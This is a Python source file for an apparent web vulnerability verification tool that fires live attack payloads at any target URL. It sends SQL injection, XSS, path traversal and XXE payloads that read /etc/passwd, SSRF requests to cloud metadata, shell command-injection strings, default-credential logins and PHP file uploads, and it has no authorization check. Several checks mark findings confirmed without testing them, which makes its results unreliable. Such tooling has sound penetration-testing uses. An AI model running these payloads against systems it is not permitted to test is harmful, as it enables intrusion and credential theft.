import httpx
import re
import asyncio
import ssl
import socket
from urllib.parse import urlparse, urlencode, quote


class VulnVerifier:
    def __init__(self):
        self.client_config = {
            "verify": False,
            "timeout": 10,
            "follow_redirects": False,
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            }
        }

    async def verify(self, finding: dict, target_url: str) -> dict:
        category = finding.get("category", "").lower()

        verifier_map = {
            "sqli": self.verify_sqli,
            "xss": self.verify_xss,
            "exposure": self.verify_exposure,
            "cors": self.verify_cors,
            "open redirect": self.verify_open_redirect,
            "headers": self.verify_headers,
            "information disclosure": self.verify_info_disclosure,
            "clickjacking": self.verify_clickjacking,
            "ssl": self.verify_ssl,
            "lfi": self.verify_lfi,
            "ssrf": self.verify_ssrf,
            "ssti": self.verify_ssti,
            "command injection": self.verify_command_injection,
            "idor": self.verify_idor,
            "broken authentication": self.verify_broken_auth,
            "file upload": self.verify_file_upload,
            "path traversal": self.verify_path_traversal,
            "xxe": self.verify_xxe,
        }

        verifier_fn = verifier_map.get(category)

        if not verifier_fn:
            finding["verified"] = True
            finding["confidence"] = "MEDIUM"
            finding["verification_note"] = "No specific verifier — included as potential finding."
            return finding

        try:
            confirmed, note = await verifier_fn(finding, target_url)
            finding["verified"] = confirmed
            finding["confidence"] = "HIGH" if confirmed else "LOW"
            finding["verification_note"] = note
        except Exception as e:
            finding["verified"] = False
            finding["confidence"] = "LOW"
            finding["verification_note"] = f"Verification error: {str(e)}"

        return finding

    async def verify_sqli(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep SQLi verification:
        1. Boolean-based: true vs false condition gives different responses
        2. Error-based: error strings appear with malicious payload
        3. Time-based: sleep payload causes delay
        """
        test_params = ["id", "search", "q", "cat", "artist", "user", "item", "page"]

        async with httpx.AsyncClient(**self.client_config) as client:
            for param in test_params:
                try:
                    # Step 1: Get baseline
                    baseline = await client.get(f"{target_url}?{param}=1")
                    baseline_body = baseline.text.lower()
                    baseline_len = len(baseline.text)

                    # Step 2: Boolean true (should match baseline)
                    true_res = await client.get(f"{target_url}?{param}=1 AND 1=1--")
                    # Step 3: Boolean false (should differ from baseline)
                    false_res = await client.get(f"{target_url}?{param}=1 AND 1=2--")

                    # Boolean-based confirmation
                    true_len = len(true_res.text)
                    false_len = len(false_res.text)

                    if abs(true_len - baseline_len) < 50 and abs(false_len - baseline_len) > 200:
                        return True, f"Boolean SQLi confirmed on param '{param}': TRUE={true_len}b, FALSE={false_len}b (diff={abs(false_len-baseline_len)}b)"

                    # Step 4: Error-based check
                    error_res = await client.get(f"{target_url}?{param}=1'")
                    error_body = error_res.text.lower()

                    sql_errors = [
                        "you have an error in your sql syntax",
                        "warning: mysql_fetch",
                        "unclosed quotation mark",
                        "quoted string not properly terminated",
                        "ora-01756",
                        "microsoft ole db provider for sql server",
                        "invalid query",
                        "pg_query",
                        "sqlite_master",
                        "syntax error or access violation",
                    ]

                    for error in sql_errors:
                        if error in error_body and error not in baseline_body:
                            return True, f"Error-based SQLi confirmed on param '{param}': SQL error '{error}' triggered"

                    # Step 5: Time-based (only if others fail)
                    import time
                    sleep_payloads = [
                        f"1; WAITFOR DELAY '0:0:3'--",
                        f"1' AND SLEEP(3)--",
                        f"1; SELECT pg_sleep(3)--",
                    ]
                    for payload in sleep_payloads:
                        start = time.time()
                        try:
                            sleep_res = await client.get(
                                f"{target_url}?{param}={quote(payload)}",
                            )
                            elapsed = time.time() - start
                            if elapsed >= 2.5:
                                return True, f"Time-based SQLi confirmed on param '{param}': response delayed {elapsed:.1f}s with sleep payload"
                        except Exception:
                            continue

                except Exception:
                    continue

        return False, "SQLi could not be confirmed after boolean, error-based and time-based tests"

    async def verify_xss(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep XSS verification:
        1. Check payload reflects unencoded
        2. Check context (HTML body, attribute, JS)
        3. Try multiple encodings
        """
        test_params = ["q", "search", "input", "name", "s", "query", "keyword", "term"]

        payloads = [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
        ]

        async with httpx.AsyncClient(**self.client_config) as client:
            for param in test_params:
                # Get baseline first
                try:
                    baseline = await client.get(f"{target_url}?{param}=hello123")
                    if "hello123" not in baseline.text:
                        continue  # param not reflected at all, skip
                except Exception:
                    continue

                for payload in payloads:
                    try:
                        res = await client.get(f"{target_url}?{param}={quote(payload)}")
                        body = res.text

                        # Check unencoded reflection
                        if payload in body:
                            # Determine context
                            idx = body.find(payload)
                            context = body[max(0, idx-50):idx+len(payload)+50]
                            return True, f"XSS confirmed: payload reflected unencoded via param '{param}'. Context: ...{context[:80]}..."

                        # Check partial reflection (tag broke out of attribute)
                        if "<script>" in body and "alert" in body:
                            return True, f"XSS confirmed: script tag reflected in response via param '{param}'"

                        if "onerror=alert" in body or "onload=alert" in body:
                            return True, f"XSS confirmed: event handler reflected via param '{param}'"

                    except Exception:
                        continue

        return False, "XSS payload was not reflected unencoded in any tested parameter"

    async def verify_exposure(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep sensitive file verification:
        Checks actual content, not just status code.
        """
        sensitive_paths = {
            "/.env": [
                "DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL",
                "APP_SECRET", "MAIL_PASSWORD", "AWS_SECRET", "STRIPE_SECRET",
                "REDIS_PASSWORD", "JWT_SECRET", "PRIVATE_KEY"
            ],
            "/.git/config": ["[core]", "[remote", "repositoryformatversion", "filemode"],
            "/.git/HEAD": ["ref: refs/heads/"],
            "/phpinfo.php": ["PHP Version", "phpinfo()", "Configuration File"],
            "/wp-config.php": ["DB_NAME", "DB_USER", "DB_PASSWORD", "table_prefix", "AUTH_KEY"],
            "/.htaccess": ["RewriteEngine", "RewriteRule", "AuthType", "Options"],
            "/backup.sql": ["CREATE TABLE", "INSERT INTO", "DROP TABLE", "USE "],
            "/db.sql": ["CREATE TABLE", "INSERT INTO", "DROP TABLE"],
            "/.htpasswd": ["$apr1$", "$2y$", "$1$"],
            "/config.php": ["define(", "mysql_connect", "mysqli_connect"],
            "/server-status": ["Apache Server Status", "Total accesses"],
            "/web.config": ["<configuration>", "<connectionStrings>", "<appSettings>"],
            "/settings.py": ["SECRET_KEY", "DATABASES", "ALLOWED_HOSTS"],
            "/config.yml": ["database:", "password:", "secret:"],
            "/config.json": ["password", "secret", "apiKey", "token"],
            "/credentials.json": ["client_secret", "private_key", "auth_uri"],
            "/id_rsa": ["-----BEGIN", "PRIVATE KEY", "RSA PRIVATE"],
        }

        async with httpx.AsyncClient(**self.client_config) as client:
            for path, indicators in sensitive_paths.items():
                if path not in finding.get("evidence", "") and path not in finding.get("title", ""):
                    continue
                try:
                    res = await client.get(f"{target_url}{path}")
                    if res.status_code != 200:
                        return False, f"'{path}' returns {res.status_code} — not accessible"

                    body = res.text
                    content_type = res.headers.get("content-type", "")

                    # Check for actual sensitive content
                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            return True, f"CONFIRMED: '{path}' is exposed and contains '{indicator}'"

                    # Check if it's a real file (not a 404 page)
                    if len(body) < 100:
                        return False, f"'{path}' returns 200 but content is too short — likely a custom 404"

                    # Check if content type makes sense
                    if "html" in content_type and path not in ["/phpinfo.php", "/server-status"]:
                        return False, f"'{path}' returns HTML — likely a redirect or custom 404 page"

                    return False, f"'{path}' returns 200 but no sensitive indicators found"

                except Exception:
                    continue

        return False, "Sensitive file exposure could not be confirmed"

    async def verify_cors(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep CORS verification:
        1. Wildcard with credentials (critical)
        2. Origin reflection with credentials (critical)
        3. Null origin (high)
        4. Subdomain takeover angle
        """
        async with httpx.AsyncClient(**self.client_config) as client:
            test_origins = [
                "https://evil.com",
                "null",
                f"https://evil.{urlparse(target_url).netloc}",
                "https://attacker.com",
            ]

            for origin in test_origins:
                try:
                    res = await client.get(target_url, headers={"Origin": origin})
                    acao = res.headers.get("access-control-allow-origin", "")
                    acac = res.headers.get("access-control-allow-credentials", "").lower()
                    acam = res.headers.get("access-control-allow-methods", "")

                    if acao == "*" and acac == "true":
                        return True, "CRITICAL: Wildcard CORS with credentials=true — full exploit possible"

                    if acao == "*":
                        return True, "HIGH: Wildcard CORS policy confirmed (credentials not explicitly allowed)"

                    if acao == origin and acac == "true":
                        return True, f"CRITICAL: CORS reflects '{origin}' with credentials=true — account takeover possible"

                    if acao == origin:
                        return True, f"MEDIUM: CORS reflects controlled origin '{origin}' (without credentials)"

                    if acao == "null":
                        return True, "HIGH: CORS allows null origin — exploitable via sandboxed iframes"

                except Exception:
                    continue

        return False, "CORS policy appears correctly configured — no misconfigurations confirmed"

    async def verify_open_redirect(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep open redirect verification:
        Follow the redirect chain and verify final destination.
        """
        test_params = ["redirect", "url", "next", "return", "returnUrl", "redirect_url", "goto", "target", "dest"]
        evil_urls = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com/",
        ]

        async with httpx.AsyncClient(
            verify=False, timeout=10,
            follow_redirects=True,
            headers=self.client_config["headers"]
        ) as client:
            for param in test_params:
                for evil_url in evil_urls:
                    try:
                        res = await client.get(f"{target_url}?{param}={quote(evil_url)}")

                        # Check if we ended up at evil domain
                        final_url = str(res.url)
                        if "evil.com" in final_url:
                            return True, f"Open redirect CONFIRMED: param '{param}' redirected to {final_url}"

                        # Check redirect headers
                        if res.history:
                            for redirect in res.history:
                                location = redirect.headers.get("location", "")
                                if "evil.com" in location:
                                    return True, f"Open redirect CONFIRMED: param '{param}' → Location: {location}"

                    except Exception:
                        continue

        return False, "Open redirect could not be confirmed — target properly validates redirect URLs"

    async def verify_headers(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Verify missing security headers with double-check on multiple endpoints.
        """
        title = finding.get("title", "").lower()

        header_map = {
            "content-security-policy": "content-security-policy",
            "x-frame-options": "x-frame-options",
            "strict-transport-security": "strict-transport-security",
            "x-content-type-options": "x-content-type-options",
            "referrer-policy": "referrer-policy",
            "permissions-policy": "permissions-policy",
            "x-xss-protection": "x-xss-protection",
        }

        target_header = None
        for key, header in header_map.items():
            if key in title:
                target_header = header
                break

        if not target_header:
            return True, "Header absence confirmed from initial scan"

        # Check on multiple endpoints
        test_paths = ["", "/", "/index.html", "/about", "/login"]
        absent_count = 0

        async with httpx.AsyncClient(**self.client_config) as client:
            for path in test_paths:
                try:
                    res = await client.get(f"{target_url}{path}")
                    headers_lower = {k.lower(): v for k, v in res.headers.items()}
                    if target_header not in headers_lower:
                        absent_count += 1
                except Exception:
                    continue

        if absent_count >= 2:
            return True, f"Confirmed: '{target_header}' absent on {absent_count}/{len(test_paths)} tested endpoints"

        return False, f"Header '{target_header}' found on some endpoints — inconsistent, possible false positive"

    async def verify_info_disclosure(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Verify info disclosure by checking exact version strings.
        """
        async with httpx.AsyncClient(**self.client_config) as client:
            try:
                res = await client.head(target_url)
                headers_lower = {k.lower(): v for k, v in res.headers.items()}

                disclosure_headers = {
                    "server": r"(apache|nginx|iis|lighttpd|jetty|tomcat)[/\s][\d.]+",
                    "x-powered-by": r"(php|asp\.net|express|django|rails)[/\s][\d.]*",
                    "x-aspnet-version": r"[\d.]+",
                    "x-aspnetmvc-version": r"[\d.]+",
                    "x-generator": r".+",
                    "x-drupal-cache": r".+",
                }

                for header, pattern in disclosure_headers.items():
                    value = headers_lower.get(header, "")
                    if value and re.search(pattern, value, re.IGNORECASE):
                        return True, f"CONFIRMED: '{header}: {value}' reveals technology/version info"

            except Exception:
                pass

        return False, "No specific version or technology information disclosed in headers"

    async def verify_clickjacking(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep clickjacking verification:
        Check both defensive headers AND try to actually frame the page.
        """
        async with httpx.AsyncClient(**self.client_config) as client:
            try:
                res = await client.get(target_url)
                headers_lower = {k.lower(): v for k, v in res.headers.items()}

                xfo = headers_lower.get("x-frame-options", "").upper()
                csp = headers_lower.get("content-security-policy", "").lower()

                # Check X-Frame-Options
                if xfo in ["DENY", "SAMEORIGIN"]:
                    return False, f"X-Frame-Options: {xfo} — clickjacking prevented"

                # Check CSP frame-ancestors
                if "frame-ancestors 'none'" in csp or "frame-ancestors 'self'" in csp:
                    return False, "CSP frame-ancestors directive prevents framing"

                # No protection found
                if not xfo and "frame-ancestors" not in csp:
                    return True, "CONFIRMED: No X-Frame-Options or CSP frame-ancestors — page can be framed"

                # Weak X-Frame-Options
                if xfo == "ALLOWALL":
                    return True, "CONFIRMED: X-Frame-Options: ALLOWALL explicitly allows framing"

            except Exception as e:
                return True, f"Could not complete verification — treating as potential issue"

        return False, "Page appears protected against clickjacking"

    async def verify_ssl(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """SSL findings are verified via direct socket — always confirmed."""
        return True, "SSL verification performed via direct TLS socket connection"

    async def verify_lfi(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep LFI verification:
        Check if actual file contents are returned.
        """
        lfi_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "..%2F..%2Fetc%2Fpasswd",
        ]
        linux_indicators = ["root:x:0:0", "daemon:x:", "/bin/bash", "/bin/sh"]
        windows_indicators = ["[boot loader]", "for 16-bit app support", "\\windows\\"]

        test_params = ["file", "page", "include", "path", "template", "doc", "view", "load"]

        async with httpx.AsyncClient(**self.client_config) as client:
            for param in test_params:
                for payload in lfi_payloads:
                    try:
                        res = await client.get(f"{target_url}?{param}={payload}")
                        body = res.text

                        for indicator in linux_indicators + windows_indicators:
                            if indicator in body:
                                return True, f"LFI CONFIRMED: '{indicator}' found in response via param '{param}' with payload '{payload}'"

                    except Exception:
                        continue

        return False, "LFI could not be confirmed — file contents not returned"

    async def verify_ssrf(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep SSRF verification:
        Check if internal metadata endpoints are accessible.
        """
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://localhost/",
            "http://127.0.0.1/",
        ]

        ssrf_indicators = [
            "ami-id", "instance-id", "local-ipv4", "security-credentials",
            "computeMetadata", "instance", "project-id"
        ]

        test_params = ["url", "uri", "path", "dest", "redirect", "proxy", "fetch", "load", "src", "href"]

        async with httpx.AsyncClient(**self.client_config) as client:
            for param in test_params:
                for payload in ssrf_payloads:
                    try:
                        res = await client.get(f"{target_url}?{param}={quote(payload)}", timeout=5)
                        body = res.text

                        for indicator in ssrf_indicators:
                            if indicator.lower() in body.lower():
                                return True, f"SSRF CONFIRMED: metadata indicator '{indicator}' found via param '{param}'"

                        # Check if we got an internal response
                        if res.status_code == 200 and len(body) > 0 and "169.254" in payload:
                            return True, f"SSRF LIKELY: Got 200 response to cloud metadata URL via param '{param}'"

                    except Exception:
                        continue

        return False, "SSRF could not be confirmed — internal endpoints not accessible"

    async def verify_ssti(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep SSTI verification:
        Send math expression and verify calculated result is returned.
        """
        # Send {{7*7}} and check if 49 appears in response
        ssti_payloads = {
            "{{7*7}}": "49",
            "${7*7}": "49",
            "<%= 7*7 %>": "49",
            "#{7*7}": "49",
            "*{7*7}": "49",
            "{{7*'7'}}": "7777777",  # Jinja2 specific
        }

        test_params = ["q", "search", "name", "template", "input", "msg", "message"]

        async with httpx.AsyncClient(**self.client_config) as client:
            for param in test_params:
                # Get baseline first
                try:
                    baseline = await client.get(f"{target_url}?{param}=hello")
                    if "hello" not in baseline.text:
                        continue
                except Exception:
                    continue

                for payload, expected in ssti_payloads.items():
                    try:
                        res = await client.get(f"{target_url}?{param}={quote(payload)}")
                        body = res.text

                        if expected in body and payload not in body:
                            return True, f"SSTI CONFIRMED: '{payload}' evaluated to '{expected}' via param '{param}' — template injection possible"

                    except Exception:
                        continue

        return False, "SSTI could not be confirmed — template expressions not evaluated"

    async def verify_command_injection(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep command injection verification:
        Use time-based detection (sleep) to confirm.
        """
        import time

        sleep_payloads = [
            "; sleep 3",
            "| sleep 3",
            "|| sleep 3",
            "& sleep 3",
            "&& sleep 3",
            "`sleep 3`",
            "$(sleep 3)",
            "; ping -c 3 127.0.0.1",
        ]

        test_params = ["cmd", "exec", "command", "run", "query", "input", "ping", "host"]

        async with httpx.AsyncClient(**self.client_config) as client:
            for param in test_params:
                for payload in sleep_payloads:
                    try:
                        start = time.time()
                        res = await client.get(
                            f"{target_url}?{param}={quote(payload)}",
                        )
                        elapsed = time.time() - start

                        if elapsed >= 2.5:
                            return True, f"Command injection CONFIRMED: sleep payload caused {elapsed:.1f}s delay via param '{param}'"

                    except Exception:
                        continue

        return False, "Command injection could not be confirmed via time-based detection"

    async def verify_idor(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep IDOR verification:
        Check if different IDs return different user-specific data.
        """
        test_params = ["id", "user_id", "account", "order", "invoice", "doc_id", "record"]

        async with httpx.AsyncClient(**self.client_config) as client:
            for param in test_params:
                try:
                    # Get baseline with ID=1
                    res1 = await client.get(f"{target_url}?{param}=1")
                    # Try ID=2
                    res2 = await client.get(f"{target_url}?{param}=2")
                    # Try ID=0
                    res0 = await client.get(f"{target_url}?{param}=0")

                    # If all return 200 with different content lengths — potential IDOR
                    if (res1.status_code == 200 and
                        res2.status_code == 200 and
                        abs(len(res1.text) - len(res2.text)) > 100):

                        # Check for user-specific data patterns
                        user_patterns = [
                            r"email.*@", r"username.*:", r"user_id.*\d+",
                            r"account.*\d+", r"name.*[A-Z][a-z]+"
                        ]

                        for pattern in user_patterns:
                            if re.search(pattern, res1.text, re.IGNORECASE) and \
                               re.search(pattern, res2.text, re.IGNORECASE):
                                return True, f"IDOR LIKELY: Different user data returned for ID=1 vs ID=2 via param '{param}'"

                except Exception:
                    continue

        return False, "IDOR could not be confirmed — responses don't indicate user-specific data access"

    async def verify_broken_auth(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep broken auth verification:
        Try common credentials and check for successful login indicators.
        """
        login_paths = ["/login", "/admin", "/wp-login.php", "/administrator", "/user/login"]
        credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("test", "test"),
        ]

        success_indicators = [
            "dashboard", "welcome", "logout", "sign out",
            "my account", "profile", "admin panel"
        ]

        async with httpx.AsyncClient(**self.client_config) as client:
            for path in login_paths:
                try:
                    login_url = f"{target_url}{path}"
                    # Check if login page exists
                    check = await client.get(login_url)
                    if check.status_code not in [200, 301, 302]:
                        continue

                    for username, password in credentials:
                        try:
                            res = await client.post(
                                login_url,
                                data={"username": username, "password": password,
                                      "user": username, "pass": password,
                                      "email": username, "log": username, "pwd": password},
                                follow_redirects=True,
                            )
                            body = res.text.lower()

                            for indicator in success_indicators:
                                if indicator in body:
                                    return True, f"Broken auth CONFIRMED: logged in with '{username}:{password}' at {login_url} — found '{indicator}'"

                        except Exception:
                            continue

                except Exception:
                    continue

        return False, "Default credentials did not work — authentication appears properly configured"

    async def verify_xxe(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep XXE verification:
        Send XML with external entity and check if file contents returned.
        """
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]

        linux_indicators = ["root:x:0:0", "daemon:x:1:", "/bin/bash"]

        content_types = [
            "application/xml",
            "text/xml",
            "application/json",
        ]

        async with httpx.AsyncClient(**self.client_config) as client:
            for payload in xxe_payloads:
                for content_type in content_types:
                    try:
                        res = await client.post(
                            target_url,
                            content=payload,
                            headers={**self.client_config["headers"], "Content-Type": content_type}
                        )
                        body = res.text

                        for indicator in linux_indicators:
                            if indicator in body:
                                return True, f"XXE CONFIRMED: '{indicator}' found in response — file read via XML entity"

                    except Exception:
                        continue

        return False, "XXE could not be confirmed — XML external entities not processed"

    async def verify_file_upload(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep file upload verification:
        Check if upload endpoints accept dangerous file types.
        """
        upload_paths = ["/upload", "/api/upload", "/file/upload", "/upload.php", "/admin/upload"]
        dangerous_extensions = [".php", ".asp", ".jsp", ".sh", ".py"]

        async with httpx.AsyncClient(**self.client_config) as client:
            for path in upload_paths:
                try:
                    upload_url = f"{target_url}{path}"
                    check = await client.get(upload_url)
                    if check.status_code not in [200, 405]:
                        continue

                    for ext in dangerous_extensions:
                        try:
                            files = {"file": (f"test{ext}", b"<?php echo 'test'; ?>", "application/octet-stream")}
                            res = await client.post(upload_url, files=files)

                            if res.status_code in [200, 201] and "error" not in res.text.lower():
                                return True, f"File upload CONFIRMED: '{ext}' file accepted at {upload_url}"

                        except Exception:
                            continue

                except Exception:
                    continue

        return False, "File upload restriction could not be bypassed"

    async def verify_path_traversal(self, finding: dict, target_url: str) -> tuple[bool, str]:
        """
        Deep path traversal verification:
        Check if actual system file contents are returned.
        """
        traversal_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2fetc%2fpasswd",
            "..%252f..%252fetc%252fpasswd",
        ]

        linux_indicators = ["root:x:0:0", "daemon:x:1:", "/bin/bash"]
        test_params = ["file", "path", "page", "doc", "folder", "root", "inc", "show", "read"]

        async with httpx.AsyncClient(**self.client_config) as client:
            for param in test_params:
                for payload in traversal_payloads:
                    try:
                        res = await client.get(f"{target_url}?{param}={quote(payload)}")
                        body = res.text

                        for indicator in linux_indicators:
                            if indicator in body:
                                return True, f"Path traversal CONFIRMED: '{indicator}' found via param '{param}'"

                    except Exception:
                        continue

        return False, "Path traversal could not be confirmed — file system not accessible"